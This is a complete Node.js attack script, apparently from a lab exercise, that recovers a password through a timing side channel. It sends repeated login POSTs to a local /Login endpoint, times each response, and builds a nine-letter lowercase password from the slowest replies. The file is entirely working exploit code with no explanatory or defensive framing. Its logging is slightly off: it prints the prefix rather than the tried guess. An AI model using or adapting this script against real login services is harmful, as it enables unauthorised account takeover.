var fetch = require('cross-fetch');
function tryLogin(password) {
return fetch('http://localhost:7681/Login', {
method: 'POST',
headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
body: `password=${password}`,
});
}
let alphabet = 'abcdefghijklmnopqrstuvwxyz';
async function hackPassword() {
let hackedPassword = '';
let j=1;
while(j<=9){
let hackedletter = '';
let high = 0
for (let letter of alphabet) {
let guess = hackedPassword + letter;
let startTime = new Date().getTime();
let resp = await tryLogin(guess);
let reqTime = new Date().getTime() - startTime;
if(high < reqTime){
hackedletter = letter;
high = reqTime;
}
guess = hackedPassword;
console.log(`guess: ${guess} took ${reqTime} milliseconds login success: ${resp.ok}`);
}
hackedPassword += hackedletter
console.log("Letter selected: "+hackedletter);
console.log("hackedPassword: "+hackedPassword);
j++;
}
}
hackPassword();